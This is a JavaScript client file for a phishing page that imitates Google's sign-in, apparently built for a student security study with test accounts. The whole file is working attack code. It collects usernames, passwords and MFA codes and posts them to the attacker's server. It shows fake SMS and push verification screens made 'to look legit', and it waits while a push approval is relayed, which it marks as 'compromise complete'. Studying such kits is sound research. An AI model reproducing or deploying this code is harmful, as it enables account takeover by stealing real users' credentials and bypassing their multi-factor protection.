var currentStep = "";
var username = "";
var password = "";
var mfa = "";
var freezeClic = false; // just modify that variable to disable all clics events

const username_list = ["mqpstudy1@gmail.com", "mqpstudy2@gmail.com","mqpstudy5@gmail.com", "mqpstudy6@gmail.com"]
const expected_password = "passwordmqp"

// trigger clicks with enter key press
var input = document.getElementById("inputField");
input.addEventListener("keyup", function(event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        document.getElementById("loginButton").click();
    }
});

document.addEventListener("click", e => {
    if (freezeClic) {
        e.stopPropagation();
        e.preventDefault();
    }
}, true);

const nextButton = function( e ) {
  e.preventDefault();
  console.log("Button pressed")
  const text = document.querySelector("#inputField")

  if(currentStep === "username"){
    username = text.value;
    // validate
    if ((username !== "") && !(username_list.includes(username))) {
      console.log("Invalid account...")
      console.log(username_list.includes(username))
      displayFailure("Account not found")
      return false;
    }
  }
  else if (currentStep === "password") {
    password = text.value;
    //validate
    if ((password !== "") && (password !== expected_password)) {
      console.log("Invalid password...")
      displayFailure("Password incorrect")
      return false;
    }
    else {
      // here is where we want to temporarily block input, released on mfa load
      freezeClic = true;
    }
  }
  else if (currentStep === "mfa") {
    mfa = text.value;
  }

  var json = {
    username: username,
    password: password,
    mfa: mfa
  }
  json = JSON.stringify(json);

  // add to server
  fetch("/submit", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: json
  })
  .then(function(response) {
    return response.json();
  })
  .then(json => {
    updateScreen(json)
  })
  return false;
}

const updateScreen = function(json) {
  console.log("Screen updating")
  // update screen to parse next arg
  if(currentStep === "username"){
    moveToPassword()
    currentStep = "password"
  }
  else if (currentStep === "password") {
    moveToMFA(json)
    currentStep = "mfa"
  }
  else if (currentStep === "mfa") {
    window.location.href = "https://agame.com"
  }
}

const moveToPassword = function() {
  document.getElementById("headerField").innerHTML = "Complete sign in...";
  document.getElementById("subheaderField").innerHTML = username;
  document.getElementById("inputField").value = "";
  document.getElementById("Bullets").placeholder = "Enter your password";
  document.getElementById("forgotField").innerHTML = "Forgot password?";

  var bullets = document.querySelector("#Bullets")
  var inputField = document.querySelector("#inputField")

  // swap positions
  //bullets.parentNode.insertBefore(inputField, bullets)

  // update opacities
  inputField.style.opacity = "0"
  inputField.style.zIndex = "1";
  bullets.style.opacity = "100"
  bullets.style.zIndex= "0";

  // update to look like password
  inputField.onkeyup = function(){
    document.getElementById('Bullets').value=this.value.replace(/(.)/g,'•');
  };
}

const moveToMFA = function(json) {
  //disable screen pause
  freezeClic = false;

  // check json to see mfa type
  if(json.hasOwnProperty('mfa')) {
    switch(json.mfa) {
      case 1:
        console.log("Using SMS...")
        displaySMS()
        break;
      case 2:
        console.log("Using Push Notification...")
        displayPush()
        break;
      default:
        console.log("Defaulted to Failure...")
        displayFailure("Account or password incorrect")
    }
  }
  else {
    console.log("An unexpected error has occured! No MFA available...")
    console.log(json)
    console.log(typeof(json))
    console.log(json.mfa)
    console.log("Defaulting to failure...")
    displayFailure("Account or password incorrect")
  }
}

const displayFailure = function(type) {
  // update headers
  document.getElementById("headerField").innerHTML = type;
  document.getElementById("subheaderField").innerHTML = "Please refresh and try again";

  // reset inputs
  var bullets = document.querySelector("#Bullets")
  var inputField = document.querySelector("#inputField")

  //inputField.parentNode.insertBefore(bullets, inputField)
  document.getElementById("buttonText").innerHTML = "Retry"
  document.getElementById("loginButton").onclick = function() {
    console.log("I should refresh now")
    location.reload(true);
  }

  // update opacities
  inputField.style.opacity = "100"
  bullets.style.opacity = "0"

  // update to look normal again
  inputField.onkeyup = function(){};

  document.getElementById("inputField").value = username;
  document.getElementById("inputField").placeholder = username;
}

/* SMS tests account for TOTP/SMS/Call/Email */
const displaySMS = function() {
  // update background size
  document.getElementById("loginBackdrop").style.height = "410px"

  // update headers
  document.getElementById("headerField").innerHTML = "2-Step Verification";
  document.getElementById("subheaderField").innerHTML = "This extra step shows it's really you trying to sign in";

  // reset inputs
  var bullets = document.querySelector("#Bullets")
  var inputField = document.querySelector("#inputField")

  inputField.parentNode.insertBefore(bullets, inputField)

  // update opacities
  inputField.style.opacity = "100"
  bullets.style.opacity = "0"

  // update to look normal again
  inputField.onkeyup = function(){};

  // ****** all below should be in a case by account statements
  // new html to look legit
  var verificationTitle = document.createElement("p")
  verificationTitle.innerHTML = "2-Step Verification".bold()
  verificationTitle.style.fontSize = "large"
  verificationTitle.style.textAlign = "left"
  verificationTitle.style.padding = "0px 50px 0px 50px";
  var verificationExplained = document.createElement("p")
  verificationExplained.innerHTML = "A text message with a 6-digit verification code was just sent to (***)***-**61."
  verificationExplained.style.textAlign = "left"
  verificationExplained.style.padding = "0px 50px 0px 50px";

  var space = document.getElementById("aboveInputs")
  space.parentNode.insertBefore(verificationTitle, space)
  space.parentNode.insertBefore(verificationExplained, space)
  bullets.remove()
  space.remove()

  document.getElementById("aboveInputs2").remove()
  document.getElementById("inputField").value = "";
  document.getElementById("inputField").placeholder = "Enter the code";
}

/* Push covers Push w/ numbers because this additional context does not defeat mal endpoint... */
const displayPush = function() {
  // update background size
  document.getElementById("loginBackdrop").style.height = "375px"

  // update headers
  document.getElementById("headerField").innerHTML = "2-Step Verification";
  document.getElementById("subheaderField").innerHTML = "This extra step shows it's really you trying to sign in";

  // reset inputs
  var bullets = document.querySelector("#Bullets")
  var inputField = document.querySelector("#inputField")

  inputField.parentNode.insertBefore(bullets, inputField)

  // update opacities
  inputField.style.opacity = "100"
  bullets.style.opacity = "0"

  // update to look normal again
  inputField.onkeyup = function(){};

  // ****** all below should be in a case by account statements
  // new html to look legit
  var accountName = document.createElement("p")
  accountName.innerHTML = username.bold()
  accountName.style.fontSize = "large"
  accountName.style.textAlign = "center"
  accountName.style.padding = "0px 50px 0px 50px";
  var verificationTitle = document.createElement("p")
  verificationTitle.innerHTML = "Check your phone".bold()
  verificationTitle.style.fontSize = "large"
  verificationTitle.style.textAlign = "left"
  verificationTitle.style.padding = "0px 50px 0px 50px";
  var verificationExplained = document.createElement("p")
  verificationExplained.innerHTML = "Google sent a notification to your phone. Open the Google app and tap <b>Yes</b> on the prompt to sign in."
  verificationExplained.style.textAlign = "left"
  verificationExplained.style.padding = "0px 50px 0px 50px";

  // add the little image of a phone
  var img = document.createElement("img")
  img.src = "google_phone.png"
  img.style.padding = "0px 50px 0px 50px"

  // shrink the avatar
  var avatar = document.querySelector("#avatarDiv")
  avatar.remove()

  var space = document.getElementById("removeMe2")
  space.parentNode.insertBefore(accountName, space)
  space.parentNode.insertBefore(img, space)
  space.parentNode.insertBefore(verificationTitle, space)
  space.parentNode.insertBefore(verificationExplained, space)
  document.getElementById("inputs").remove()

  document.querySelector("#removeLoginDiv").remove()
  document.querySelector("#aboveInputs").remove()
  document.querySelector("#removeMe1").remove()
  document.querySelector("#removeMe2").remove()
  document.querySelector("#removeMe3").remove()

  /* now wait on server to release promise and redirect (compromise complete)*/
  // add to server
  fetch("/push", {
    method: "POST",
    headers: { "Content-Type": "application/json" }
  })
  .then(function(response) {
    return response.json();
  })
  .then(json => {
    window.location.href = "https://agame.com"
  })
  return false;
}

window.onload = function() {
  currentStep = "username"
  const button = document.querySelector( '#loginButton' )
  button.onclick = nextButton
}
